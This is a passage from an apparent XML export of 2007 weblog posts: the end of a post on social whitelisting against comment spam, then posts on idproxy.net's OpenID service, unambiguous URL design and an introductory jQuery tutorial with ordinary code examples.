&lt;p id=&quot;p-3&quot;&gt;Here comes the social part: I'm &lt;a href=&quot;http://simonwillison.net/comments/whitelist/&quot;&gt;sharing my whitelist&lt;/a&gt;. If you run your own OpenID-enabled weblog you are welcome to include my whitelist in your comment spam heuristics. If you publish your own whitelist, I will happily do the same.&lt;/p&gt;

&lt;p id=&quot;p-4&quot;&gt;Social whitelisting benefits from being de-centralised, just like OpenID. If I find that you have whitelisted a spammer, I can unsubscribe from your whitelist. There's no central authority or point of failure.&lt;/p&gt;

&lt;p id=&quot;p-5&quot;&gt;Long-time readers may be feeling a strong sense of deja-vu. Way back in September 2003, &lt;a href=&quot;http://simonwillison.net/2003/Sep/2/blacklisting/&quot;&gt;I proposed shared comment blacklists&lt;/a&gt; as a solution to weblog comment spam. The idea was simple: every time you delete a spam comment, you add the link it was advertising to a public blacklist. Other blogs could then subscribe to your blacklist and block any new comments advertising the same site.&lt;/p&gt;

&lt;p id=&quot;p-6&quot;&gt;The blacklisting idea was flawed from the very start. It was a classic example of Marcus J. Ranum's &lt;a href=&quot;http://www.ranum.com/security/computer_security/editorials/dumb/&quot; title=&quot;The Six Dumbest Ideas in Computer Security&quot;&gt;number one dumbest idea in computer security&lt;/a&gt;: Default Permit. Spam blacklists assume that if we don't know a link is bad, it's good. Spammers can create new bad links far faster than we can blacklist them.&lt;/p&gt;

&lt;p id=&quot;p-7&quot;&gt;Here's Ranum's suggested alternative:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.ranum.com/security/computer_security/editorials/dumb/&quot;&gt;&lt;p id=&quot;p-8&quot;&gt;The opposite of &quot;Default Permit&quot; is &quot;Default Deny&quot; and it is a really good idea. It takes dedication, thought, and understanding to implement a &quot;Default Deny&quot; policy, which is why it is so seldom done. It's not that much harder to do than &quot;Default Permit&quot; but you'll sleep much better at night.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p id=&quot;p-9&quot;&gt;Social whitelisting uses Default Deny. As such, I believe it has a much higher chance of making a useful impact on the comment spam problem.&lt;/p&gt;

&lt;p id=&quot;p-10&quot;&gt;&lt;strong&gt;Update:&lt;/strong&gt; I should have mentioned that this idea developed over a number of discussions with &lt;a href=&quot;http://www.plasticbag.org/&quot;&gt;Tom Coates&lt;/a&gt;, which totally slipped my mind when I was writing it up at 3am.&lt;/p&gt;</field>
		<field name="created">2007-01-22 03:01:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1552</field>
		<field name="title">idproxy.net: Use your Yahoo! account as an OpenID</field>
		<field name="slug">idproxy</field>
		<field name="body">&lt;p&gt;In an ideal world, some or all of the sites with large user databases (Yahoo!, AOL, Google, Amazon and so on) would act as OpenID providers, allowing their users to sign in to OpenID supporting sites around the Web. Until that happens, people who want to use OpenID need to sign up for Yet Another Account to do so.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://idproxy.net/&quot;&gt;idproxy.net&lt;/a&gt;, launched today, is my attempt at speeding up the process. It uses Yahoo!'s &lt;a href=&quot;http://developer.yahoo.com/auth/&quot;&gt;Browser-Based Authentication API&lt;/a&gt; to allow you to sign in with a Yahoo! account, then lets you create one or more OpenIDs (of the form &lt;samp&gt;something.idproxy.net&lt;/samp&gt;) to use with sites that support the OpenID standard.&lt;/p&gt;

&lt;p&gt;In effect, it lets you use your Yahoo! account as an OpenID.&lt;/p&gt;

&lt;h3&gt;Phishing protection&lt;/h3&gt;

&lt;p&gt;I've built in a couple of features to help protect users against phishing attempts.&lt;/p&gt;

&lt;p&gt;The first is based on Andreas Gohr's &lt;a href=&quot;http://www.splitbrain.org/projects/monsterid&quot;&gt;MonsterID&lt;/a&gt;. When you log in for the first time, you are asked to pick one from a selection of four random monsters. Your monster will greet you when you log in to the site, helping defend against malicious sites that try to copy the &quot;logged in&quot; view.&lt;/p&gt;

&lt;p&gt;The second is a landing page based on my suggestion from last week, which requires you to log in manually or with a bookmark rather than presenting you with a login link directly. This is similar to MyOpenID's &lt;a href=&quot;http://blog.janrain.com/2007/01/24/myopenidcom-release-hullabaloo/&quot;&gt;SafeSignIn feature&lt;/a&gt;, but it's on by default and you can't turn it off.&lt;/p&gt;

&lt;p&gt;The nature of the site means that a successful phishing attack would have to compromise your Yahoo! account as well. Yahoo! have their own phishing prevention in the form of the &lt;a href=&quot;https://protect.login.yahoo.com/&quot;&gt;Yahoo! personalized sign-in seal&lt;/a&gt; (similar to the idproxy.net monster, but visible &lt;em&gt;before&lt;/em&gt; you log in).&lt;/p&gt;

&lt;h3&gt;Other providers&lt;/h3&gt;

&lt;p&gt;An older (unreleased) version of the site included support for Flickr, Upcoming and Google authentication. I've dropped those in favour of Yahoo! for a couple of reasons. Firstly, supporting just one form of authentication makes the site easier to explain. Secondly, none of those APIs were designed with single-sign-on in mind. All three exist primarily to give a third party service access to your data; as such, their authentication flows include permission pages which warn that idproxy.net will have access to your private photos, events or calendar.&lt;/p&gt;

&lt;p&gt;I'm very open to suggestions and feature requests. The top of my list at the moment is an interface for viewing and changing the list of sites which always have access to your identity.&lt;/p&gt;</field>
		<field name="created">2007-01-27 20:17:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1553</field>
		<field name="title">Why you should be using disambiguated URLs</field>
		<field name="slug">urls</field>
		<field name="body">&lt;p&gt;Good URLs are important. The best URLs are &lt;a href=&quot;http://www.flickr.com/photos/drewm/280526490/&quot;&gt;readable, reliable and hackable&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;One of the nice things about Rails, Django and other modern Web frameworks is that most of them encourage smart URL design. Rails has relatively smart defaults and a powerful routing system for custom URLs; Django forces you to think about URL design up front by defining them as regular expressions. Many of the definitive &quot;Web 2.0&quot; sites such as Flickr and del.icio.us also use well designed URLs. This is a positive trend, and long may it continue.&lt;/p&gt;

&lt;p&gt;There's one aspect of URL design that is often ignored. Good URLs should be &lt;em&gt;unambiguous&lt;/em&gt;. By that, I mean that any logical piece of content should have one and only one definitive URL, with any alternatives acting as a permanent redirect.&lt;/p&gt;

&lt;p&gt;This rule is frequently broken. Here are some examples:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;My Flickr photo stream lives at &lt;samp&gt;www.flickr.com/photos/simon/&lt;/samp&gt; and &lt;samp&gt;flickr.com/photos/simon/&lt;/samp&gt;&lt;/li&gt;
  &lt;li&gt;My del.icio.us account is at &lt;samp&gt;del.icio.us/simonw&lt;/samp&gt; and &lt;samp&gt;del.icio.us/simonw/&lt;/samp&gt;&lt;/li&gt;
  &lt;li&gt;The YDN Python Developer center lives at both &lt;samp&gt;http://developer.yahoo.com/python/&lt;/samp&gt; and &lt;samp&gt;http://developer.yahoo.com/python/index.html&lt;/samp&gt;&lt;/li&gt;
  &lt;li&gt;The Google AdSense sign-in page is at &lt;samp&gt;https://www.google.com/adsense/&lt;/samp&gt; and &lt;samp&gt;https://google.com/adsense/&lt;/samp&gt;. If you visit the latter you get a scary certificate warning (they really need to fix that).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In each of the above cases, it's obvious to regular people that the URLs are the same. Unfortunately, from a technical point of view they are different and could quite feasibly serve up different content. This causes all kinds of problems:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Caches (both browser and intermediate proxies) can't improve performance if you request the same content from a different URL.&lt;/li&gt;
  &lt;li&gt;Browser can't show users their visited links.&lt;/li&gt;
  &lt;li&gt;Social link sharing sites such as del.icio.us can't accurately aggregate links to the same resource.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;That last one in particular should catch your attention if you care about effectively promoting your site. Here's a random example, plucked from today's &lt;a href=&quot;http://del.icio.us/popular&quot;&gt;del.icio.us popular&lt;/a&gt;. &lt;a href=&quot;http://www.convinceme.net/&quot;&gt;convinceme.net&lt;/a&gt; is a new online debating site (tag clouds, gradient fills, rounded corners). It's listed in del.icio.us a total of &lt;strong&gt;four times&lt;/strong&gt;!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;samp&gt;http://www.convinceme.net/&lt;/samp&gt; has &lt;a href=&quot;http://del.icio.us/url/7baaee8f40da9c648c67d1b1bd0f7f1f&quot;&gt;36 saves&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;samp&gt;http://www.convinceme.net/index.php&lt;/samp&gt; has &lt;a href=&quot;http://del.icio.us/url/26ee29f184ae25f089638efb33e28878&quot;&gt;148 saves&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;samp&gt;http://convinceme.net/&lt;/samp&gt; has &lt;a href=&quot;http://del.icio.us/url/b1cd9926b9f30c89bdbce63882404495&quot;&gt;211 saves&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;samp&gt;http://convinceme.net/index.php&lt;/samp&gt; has &lt;a href=&quot;http://del.icio.us/url/77ddf81a6c4906a53c7b993f5b86d1ed&quot;&gt;38 saves&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Combined that's 433 saves; much more impressive, and more likely to end up at the top of a social sharing sites.&lt;/p&gt;

&lt;p&gt;Here's a useful rule of thumb:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Links to (and within) your site should never, ever end with index.php / index.html / default.aspx / any default directory index filename.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The whole point those defaults is that you can link to the containing directory to see their content, resulting in a shorter and prettier URL. If you're linking to them directly you're missing out on a golden opportunity to disambiguate your URLs.&lt;/p&gt;

&lt;p&gt;Disambiguating your URLs isn't particularly difficult. The &lt;a href=&quot;http://no-www.org/&quot;&gt;no-www site&lt;/a&gt; offers tips on having one domain name redirect to the other, and there are &lt;a href=&quot;http://rewrite.drbacchus.com/&quot; title=&quot;mod_rewrite cookbook&quot;&gt;various mod_rewrite techniques&lt;/a&gt; for achieving the desired effect as well. If mod_rewrite makes your hair stand on end, remember that if you are using a server-side scripting language such as PHP you can implement rewriting logic in your application code by examining the &lt;code&gt;$_ENV['PATH_INFO']&lt;/code&gt; variable or your platform's equivalent.&lt;/p&gt;

&lt;p&gt;Django sites get this behaviour for free, thanks to some default settings and Django's &lt;a href=&quot;http://www.djangoproject.com/documentation/middleware/#django-middleware-common-commonmiddleware&quot;&gt;CommonMiddleware&lt;/a&gt;. You can that in action on this weblog: try &lt;a href=&quot;http://simonwillison.net/2007/Feb/4/&quot;&gt;here&lt;/a&gt;, &lt;a href=&quot;http://www.simonwillison.net/2007/Feb/4&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;http://simonwillison.net/2007/Feb/4&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2007-02-04 13:57:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1567</field>
		<field name="title">jQuery for JavaScript programmers</field>
		<field name="slug">jquery</field>
		<field name="body">&lt;p&gt;When &lt;a href=&quot;http://jquery.com/&quot;&gt;jQuery&lt;/a&gt; came out back in January 2006, my first impression was that it was a cute hack. Basing everything around CSS selectors was a neat idea (see &lt;a href=&quot;http://simonwillison.net/2003/Mar/25/getElementsBySelector/&quot;&gt;getElementsBySelector&lt;/a&gt;) but the chaining stuff looked like a bit of a gimmick and the library as a whole didn't look like it would cover all of the bases. I wrote jQuery off as a passing fad.&lt;/p&gt;

&lt;p&gt;Over the past few months it's become clear to me exactly how wrong I was. jQuery is an exceptionally clever piece of engineering. It neatly encapsulates an extraordinary range of common functionality, and provides a clever plugin API for any functionality not included by default. It takes a core abstraction - that of a selection of DOM elements - and extracts as much mileage out of it as possible. Most importantly, it does so in a way that obeys best practices and plays well with other JavaScript code.&lt;/p&gt;

&lt;p&gt;Most introductions to jQuery focus on designers and inexperienced developers. I'm going to try to explain why jQuery should be of interest to experienced programmers as well.&lt;/p&gt;

&lt;h3&gt;Namespacing&lt;/h3&gt;

&lt;p&gt;The key to writing good, reusable JavaScript is to zealously manage your namespace. JavaScript provides a single global namespace (the window object), and many programmers (and some libraries) add symbols to this with abandon. &lt;a href=&quot;http://yuiblog.com/blog/2006/06/01/global-domination/&quot;&gt;Global variables are evil&lt;/a&gt;! Smart developers minimise their number of global objects, using techniques like &lt;a href=&quot;http://yuiblog.com/blog/2007/06/12/module-pattern/&quot;&gt;the module pattern&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;jQuery introduces just one symbol to the global namespace: the jQuery function/object. Everything else is either a directy property of jQuery or a method of the object returned by calls to the jQuery function.&lt;/p&gt;

&lt;p&gt;What about language enhancements? Most libraries provide some variation of map, filter and strip, functions that are sadly missing from the JavaScript engines that ship with most browsers. Some libraries directly extend JavaScript's built-in String and Array classes, but this can be a risky strategy. &lt;code&gt;String.prototype&lt;/code&gt; and &lt;code&gt;Array.prototype&lt;/code&gt; are themselves global namespaces, and adding properties to them brings the same risk of collisions as being careless with regular globals.&lt;/p&gt;

&lt;p&gt;jQuery provides a number of language enhancement functions, but each one is made available as a property of the jQuery object: &lt;code&gt;jQuery.each&lt;/code&gt;, &lt;code&gt;jQuery.extend&lt;/code&gt;, &lt;code&gt;jQuery.grep&lt;/code&gt;, &lt;code&gt;jQuery.map&lt;/code&gt;, &lt;code&gt;jQuery.merge&lt;/code&gt; and &lt;code&gt;jQuery.trim&lt;/code&gt;. There's no chance of these colliding with someone else's code.&lt;/p&gt;

&lt;h3&gt;The infamous $ function&lt;/h3&gt;

&lt;p&gt;I wasn't being entirely truthful when I said that jQuery was the only global symbol introduced: the &lt;code&gt;$&lt;/code&gt; symbol is also set up as a shortcut for jQuery. Thankfully, this is done in a non-destructive way: if you need your old &lt;code&gt;$&lt;/code&gt; function back (if you are already using code based on Prototype, for example) you can call &lt;code&gt;jQuery.noConflict()&lt;/code&gt; to revert to the old &lt;code&gt;$&lt;/code&gt; function.&lt;/p&gt;

If you want the convenience of the &lt;code&gt;$&lt;/code&gt; function for jQuery without colliding with some other use of the global &lt;code&gt;$&lt;/code&gt; function, the jQuery documentation suggests the following idiom:

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;(function($) {
    // Within this block, $ is a reference to jQuery
    // Neat, huh?
})(jQuery);&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Attaching everything to the &lt;code&gt;$&lt;/code&gt; symbol was one of the things that made me initially dismiss jQuery as a gimmick. For some reason thinking of it in terms of the jQuery symbol makes everything seem a lot more sensible, even though I'm happy to use the &lt;code&gt;$&lt;/code&gt; shortcut in my own code.&lt;/p&gt;

&lt;h3&gt;Selecting some elements&lt;/h3&gt;

&lt;p&gt;Every jQuery operation starts with selecting one or more nodes from the DOM. jQuery's &lt;a href=&quot;http://docs.jquery.com/DOM/Traversing/Selectors&quot;&gt;selection syntax&lt;/a&gt; (really a domain specific language) is an interesting hybrid of CSS 1, 2, bits of CSS 3, some XPath and a few custom extensions as well. I won't describe it in detail here, but here are some useful examples:&lt;/p&gt;

&lt;dl&gt;
&lt;dt&gt;&lt;code&gt;jQuery('div.panel')&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;All divs with class=&quot;panel&quot;&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('p#intro')&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;The paragraph with id=&quot;intro&quot;&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('div#content a:visible')&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;All visible links inside the div with id=&quot;content&quot;&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('input[@name=email]')&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;All input fields with name=&quot;email&quot;&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('table.orders tr:odd')&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;&quot;odd&quot; numbered rows in a table with class &quot;orders&quot;&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('a[@href^=&quot;http://&quot;]')&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;All external links (links that start with http://)&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('p[a]')&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;All paragraphs that contain one or more links&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;Of particular interest from the above are &lt;code&gt;:visible&lt;/code&gt; and &lt;code&gt;:odd&lt;/code&gt;, which are jQuery specific extensions. Also note that the attribute selectors use an @ sign, in common with XPath rather than CSS 2.&lt;/p&gt;

&lt;p&gt;The selection language is extremely rich, and is similar to regular expressions in that time taken to learn it will pay off many times over.&lt;/p&gt;

&lt;h3&gt;Doing stuff with them&lt;/h3&gt;

&lt;p&gt;The object returned by a jQuery selector call is an interesting beast. It represents a collection of DOM elements, and behaves a bit like an array - it has a length property, items can be accessed by index and (most importantly) &lt;a href=&quot;http://www.getfirebug.com/&quot;&gt;Firebug&lt;/a&gt; treats it as an array when displaying it in the interactive console. This is a clever illusion; the collection is actually a jQuery object, incorporating a large number of methods which can be used to query, modify and extend the collection of selected elements.&lt;/p&gt;

&lt;p&gt;There are three principle categories of jQuery methods: those that manipulate all of the matched elements, those that return a value from the first matched object, and those that modify the selection itself.&lt;/p&gt;

&lt;p&gt;I won't list all of the methods (see &lt;a href=&quot;http://visualjquery.com/&quot;&gt;visualjquery.com&lt;/a&gt; for that), but I'll illustrate with some examples. If you have Firebug you can try these out interactively: use this &lt;a href=&quot;javascript:void(function(){var s=document.createElement('script');s.src='http://code.jquery.com/jquery-1.1.2.js';document.getElementsByTagName('head')[0].appendChild(s);}())&quot;&gt;Insert jQuery&lt;/a&gt; bookmarklet first to load the jQuery library in to any page, then paste the code examples in to the Firebug console.&lt;/p&gt;

&lt;dl&gt;
&lt;dt&gt;&lt;code&gt;jQuery('div#primary').width(300);&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;Set the width of div id=&quot;primary&quot; to 300 px.&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('p').css('line-height', '1.8em');&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;Apply a line-height of 1.8em to all paragraphs.&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('li:odd').css({color: 'white', backgroundColor: 'black'});&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;Apply two CSS rules to every other list item; note that the css() function can take an object instead of two strings.&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('a[@href^=&quot;http://&quot;]').addClass('external').attr('target', '_blank');&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;Add a class of &quot;external&quot; to all external links (those beginning with http://), then add target=&quot;_blank&quot; for good measure. This makes use of chaining, described below.&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('blockquote').each(function(el) { alert(jQuery(this).text()) });&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;Iterate over every blockquote on the page, and alert its textual content (excluding HTML tags).&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('a').html('Click here!');&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;Replace all link text on the page with the insidious &quot;Click here!&quot;.&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;Here are some examples of methods that read values from the first matched element:&lt;/p&gt;

&lt;dl&gt;
&lt;dt&gt;&lt;code&gt;var width = jQuery('div').width();&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;How wide is the first div on the page?&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;var src = jQuery('img').attr('src');&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;What's the src attribute of the first image on the page?&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;var color = jQuery('h1').css('color');&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;What colour is the first h1?&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;There's a pleasing symmetry at work here: the methods used to set attributes (when passed two arguments, or an object representing multiple settings) can instead be used to read values if called with only one argument. This symmetry is used throughout jQuery, making the API much easier to commit to memory.&lt;/p&gt;

&lt;p&gt;Finally, there are methods that modify the set of selected elements itself. Many of these also provide simpler ways of traversing the DOM:&lt;/p&gt;

&lt;dl&gt;
&lt;dt&gt;&lt;code&gt;jQuery('div').not('[@id]')&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;Returns divs that do not have an id attribute.&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('h2').parent()&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;Returns all elements that are direct parents of an h2.&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('blockquote').children()&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;Returns all elements that are children of a blockquote.&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('p').eq(4).next()&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;Find the fifth paragraph on the page, then find the next element (its direct sibling to the right).&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('input:text:first').parents('form')&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;Find the form parent of the first input type=&quot;text&quot; field on the page. The optional argument to parents() is another selector.&lt;/dd&gt;
&lt;/dl&gt;

&lt;h3&gt;Chaining&lt;/h3&gt;

&lt;p&gt;The jQuery team frequently boast about jQuery's support of chaining, even to the point of declaring that &quot;jQuery is designed to change the way that you write JavaScript&quot; right on the front page. Personally I found this a big turn-off, so I'm happy to say that you can make good use of jQuery while avoiding lengthy chains of methods entirely.&lt;/p&gt;

&lt;p&gt;That said, chaining can be used for some neat tricks. In addition to chaining a bunch of DOM manipulation methods together, you can use jQuery's &lt;code&gt;end()&lt;/code&gt; method to push and pop a stack of the selected element contexts. This is a little hard to explain; essentially, every time you use a method that changes the selected set of elements (such as &lt;code&gt;children()&lt;/code&gt; or &lt;code&gt;filter()&lt;/code&gt;) you can later use &lt;code&gt;end()&lt;/code&gt; to revert back to the previous selection. Jesse Skinner gives a neat example of this in action in his tutorial &lt;a href=&quot;http://www-128.ibm.com/developerworks/library/x-ajaxjquery.html&quot;&gt;Simplify Ajax development with jQuery&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;$('form#login')
    // hide all the labels inside the form with the 'optional' class
    .find('label.optional').hide().end()
    // add a red border to any password fields in the form
    .find('input:password').css('border', '1px solid red').end()
    // add a submit handler to the form
    .submit(function(){
        return confirm('Are you sure you want to submit?');
    });
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That whole thing is essentially a one-liner. It selects a form, finds some elements within that form, applies changes to them, reverts the selection back to the original form and assigns a &lt;code&gt;submit()&lt;/code&gt; handler to it.&lt;/p&gt;

&lt;p&gt;It's a cute concept, but you don't have to use it if you don't want to. I'm quite happy splitting my code up with a few self-documenting variable names.&lt;/p&gt;

&lt;h3&gt;DOM manipulation&lt;/h3&gt;

&lt;p&gt;jQuery offers a few smart ways of making large scale manipulations to the DOM. The first is quite surprising: the jQuery function can take a snippet of HTML which it will turn in to a DOM element (it actually looks out for a string that starts with a less than sign):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;var div = jQuery('&amp;lt;div&amp;gt;Some text&amp;lt;/div&amp;gt;');
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can use chaining to add attributes to the div once it has been created:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;var div = jQuery('&amp;lt;div&amp;gt;Some text&amp;lt;/div&amp;gt;').addClass('inserted').attr('id', 'foo');
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now append it to the body tag:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;div.appendTo(document.body)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Or prepend it to a known location using a selector:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;div.prependTo('div#primary')
&lt;/code&gt;&lt;/pre&gt;

&lt;h3&gt;Handling events&lt;/h3&gt;

&lt;p&gt;All JavaScript libraries need an event handling utility and jQuery's is no exception. As with &lt;code&gt;attr()&lt;/code&gt; and &lt;code&gt;css()&lt;/code&gt;, the event methods serve dual purpose: call them with a function to assign an event handler; call them without to simulate that event being triggered:&lt;/p&gt;

&lt;dl&gt;
&lt;dt&gt;&lt;code&gt;jQuery('p').click(function() { jQuery(this).css('background-color', 'red'); });&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;Set up paragraphs so that when you click them they turn red.&lt;/dd&gt;
&lt;dt&gt;&lt;code&gt;jQuery('p:first').click()&lt;/code&gt;&lt;/dt&gt;
    &lt;dd&gt;Send a fake &quot;click&quot; to the first paragraph on the page.&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;Similar functions exist for the other browser events - mouseover, keyup and so on. Note that within an event handler the 'this' keyword is set to the element that triggered the event; using &lt;code&gt;jQuery(this)&lt;/code&gt; is a common idiom to enable jQuery methods on that element.&lt;/p&gt;

&lt;p&gt;A couple of event related functions deserve a special mention:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;jQuery('a').hover(function() {
    jQuery(this).css('background-color', 'orange');
}, function() {
    jQuery(this).css('background-color', 'white');
});
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;hover()&lt;/code&gt; is a shortcut for setting up two functions that run onmouseover and onmouseout.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;jQuery('p').one('click', function() { alert(jQuery(this).html()); });
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;one()&lt;/code&gt; sets up an event handler that will be removed after the first time it has been fired. The above example causes all paragraphs to alert their contents once the first time they are clicked.&lt;/p&gt;

&lt;p&gt;jQuery also supports custom events, through the &lt;code&gt;bind()&lt;/code&gt; and &lt;code&gt;trigger()&lt;/code&gt; methods (for which &lt;code&gt;click()&lt;/code&gt; and friends are just shortcuts). Custom events can take arguments, handled using an array passed to &lt;code&gt;trigger()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;jQuery(document).bind('stuffHappened', function(event, msg) {
    alert('stuff happened: ' + msg);
});
jQuery(document).trigger('stuffHappened', ['Hello!']);
&lt;/code&gt;&lt;/pre&gt;

&lt;h3&gt;Unobtrusive scripting&lt;/h3&gt;

&lt;p&gt;This is a topic that is very dear to me.  I still believe that the best Web applications are the ones that are still usable with scripting turned off, and that the best way to achieve that is through unobtrusive scripting, with events being assigned to elements after the regular page has been loaded (see &lt;a href=&quot;http://onlinetools.org/articles/unobtrusivejavascript/&quot;&gt;Unobtrusive Scripting&lt;/a&gt; and &lt;a href=&quot;http://domscripting.com/blog/display/41&quot;&gt;Hijax&lt;/a&gt; for more).&lt;/p&gt;

&lt;p&gt;jQuery has excellent support for this. Firstly, the node selection metaphor is core to both jQuery and unobtrusive scripting as a whole. Secondly, jQuery ships with a solution to &lt;a href=&quot;http://peter.michaux.ca/article/553&quot;&gt;the window.onload problem&lt;/a&gt; based on Dean Edwards' work getting a &quot;DOM loaded&quot; event to work cross-browser. You can set a function up to run when the DOM is ready for it like so:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;jQuery(document).ready(function() {
    alert('The DOM is ready!');
});
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Even better, you can shortcut the above by passing your function directly to &lt;code&gt;jQuery()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;jQuery(function() {
    alert('The DOM is ready!');
});
&lt;/code&gt;&lt;/pre&gt;

&lt;h3&gt;jQuery and Ajax&lt;/h3&gt;

&lt;p&gt;jQuery has the best API for Ajax I've seen in any of the major libraries. The most simple form of an Ajax call looks like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;jQuery('div#intro').load('/some/fragment.html');
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This performs a GET request against &lt;var&gt;/some/fragment.html&lt;/var&gt; and populates div#intro with the returned HTML fragment.&lt;/p&gt;

&lt;p&gt;The first time I saw this, I was unimpressed. It's a neat shortcut, but what if you want to do something more advanced like display an Ajax loading indicator? jQuery exposes custom events (&lt;code&gt;ajaxStart&lt;/code&gt;, &lt;code&gt;ajaxComplete&lt;/code&gt;, &lt;code&gt;ajaxError&lt;/code&gt; and more) for you to hook in this kind of code. It also offers a comprehensive low-level API for more complex Ajax interactions:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;jQuery.get('/some/script.php', {'name': 'Simon'}, function(data) {
    alert('The server said: ' + data);
}); // GET against /some/script.php?name=Simon

jQuery.post('/some/script.php', {'name': 'Simon'}, function(data) {
    alert('The server said: ' + data);
}); // POST to /some/script.php

jQuery.getJSON('/some.json', function(json) {
    alert('JSON rocks: ' + json.foo + ' ' + json.bar);
}); // Retrieves and parses /some.json as JSON

jQuery.getScript('/script.js'); // GET and eval() /script.js
&lt;/code&gt;&lt;/pre&gt;

&lt;h3&gt;Plugins&lt;/h3&gt;

&lt;p&gt;Considering the amount of functionality you get out of the box, jQuery is actually pretty small - it comes in at 20KB when minified, even smaller when gzipped. Additional functionality outside the framework is handled using plugins, which can (and do) add brand new methods to the existing jQuery instance object. If you want to be able to run:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;jQuery('p').bounceAroundTheScreenAndTurnGreen();
&lt;/code&gt;&lt;/pre&gt;

